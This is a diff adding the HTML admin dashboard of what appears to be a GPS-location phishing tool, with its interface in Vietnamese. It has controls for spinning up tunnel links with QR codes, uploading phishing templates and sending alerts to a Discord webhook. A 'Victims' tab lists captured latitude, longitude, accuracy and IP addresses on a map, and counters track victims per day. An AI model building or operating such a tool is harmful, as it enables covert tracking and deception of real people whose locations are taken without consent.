@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>🛡️ GPS Tunnel Admin – Quest Edition</title>
+  <link rel="stylesheet" href="/static/css/style.css">
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&family=Roboto+Mono&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+</head>
+<body>
+  <!-- Sidebar -->
+  <nav id="sidebar">
+    <div class="logo">⚔️ GPS Tunnel</div>
+    <ul class="nav-links">
+      <li class="nav-item active" data-tab="overview">📊 Tổng quan</li>
+      <li class="nav-item" data-tab="tunnels">🔗 Quản lý Tunnel</li>
+      <li class="nav-item" data-tab="victims">🎯 Nạn nhân</li>
+      <li class="nav-item" data-tab="templates">📜 Templates</li>
+      <li class="nav-item" data-tab="settings">⚙️ Cài đặt</li>
+    </ul>
+    <div class="sidebar-footer">
+      <span id="connection-status">🟢 Đã kết nối</span>
+    </div>
+  </nav>
+
+  <!-- Main content -->
+  <main id="main-content">
+    <!-- Tab Overview -->
+    <section id="tab-overview" class="tab-content active">
+      <h2>📊 Tổng quan hệ thống</h2>
+      <div class="cards-grid">
+        <div class="stat-card">
+          <h3>Tổng Tunnel</h3>
+          <p id="stat-total-tunnels">0</p>
+        </div>
+        <div class="stat-card">
+          <h3>Đang chạy</h3>
+          <p id="stat-running-tunnels">0</p>
+        </div>
+        <div class="stat-card">
+          <h3>Nạn nhân hôm nay</h3>
+          <p id="stat-victims-today">0</p>
+        </div>
+        <div class="stat-card">
+          <h3>Tổng nạn nhân</h3>
+          <p id="stat-victims-total">0</p>
+        </div>
+      </div>
+      <div class="quick-actions">
+        <button class="btn-primary" onclick="createTunnel(1)">+ Tạo 1 Tunnel</button>
+        <button class="btn-danger" onclick="stopAllTunnels()">⏹️ Dừng tất cả</button>
+      </div>
+    </section>
+
+    <!-- Tab Tunnels -->
+    <section id="tab-tunnels" class="tab-content">
+      <h2>🔗 Quản lý Tunnel</h2>
+      <div class="toolbar">
+        <input type="number" id="tunnel-quantity" value="1" min="1" max="20" placeholder="Số lượng">
+        <button class="btn-primary" onclick="createTunnel()">Tạo Tunnel</button>
+        <button class="btn-secondary" onclick="loadTunnels()">🔄 Làm mới</button>
+      </div>
+      <div class="table-container">
+        <table id="tunnels-table">
+          <thead>
+            <tr>
+              <th>ID</th>
+              <th>URL</th>
+              <th>Trạng thái</th>
+              <th>Thời gian tạo</th>
+              <th>Hành động</th>
+            </tr>
+          </thead>
+          <tbody></tbody>
+        </table>
+      </div>
+    </section>
+
+    <!-- Tab Victims -->
+    <section id="tab-victims" class="tab-content">
+      <h2>🎯 Nạn nhân</h2>
+      <div class="two-columns">
+        <div class="table-container">
+          <table id="victims-table">
+            <thead>
+              <tr>
+                <th>Thời gian</th>
+                <th>Vĩ độ</th>
+                <th>Kinh độ</th>
+                <th>Độ chính xác</th>
+                <th>IP</th>
+              </tr>
+            </thead>
+            <tbody></tbody>
+          </table>
+        </div>
+        <div id="map" style="height: 400px;"></div>
+      </div>
+    </section>
+
+    <!-- Tab Templates -->
+    <section id="tab-templates" class="tab-content">
+      <h2>📜 Templates Phishing</h2>
+      <button class="btn-primary" onclick="uploadTemplate()">📤 Upload Template Mới</button>
+      <div id="template-list" class="grid-list"></div>
+    </section>
+
+    <!-- Tab Settings -->
+    <section id="tab-settings" class="tab-content">
+      <h2>⚙️ Cài đặt</h2>
+      <form id="settings-form">
+        <label>Discord Webhook URL</label>
+        <input type="text" id="webhook-url" placeholder="https://discord.com/api/webhooks/...">
+        <label>Giới hạn tunnel tối đa</label>
+        <input type="number" id="max-tunnels" value="20">
+        <label>Tự động dừng tunnel sau (phút, 0 = không giới hạn)</label>
+        <input type="number" id="auto-stop-minutes" value="0">
+        <button type="submit" class="btn-primary">💾 Lưu cài đặt</button>
+      </form>
+    </section>
+  </main>
+
+  <!-- Modal QR -->
+  <div id="qr-modal" class="modal">
+    <div class="modal-content">
+      <span class="close" onclick="closeModal()">&times;</span>
+      <img id="qr-image" src="" alt="QR Code">
+      <p id="qr-url"></p>
+    </div>
+  </div>
+
+  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+  <script src="/static/js/app.js"></script>
+</body>
+</html>
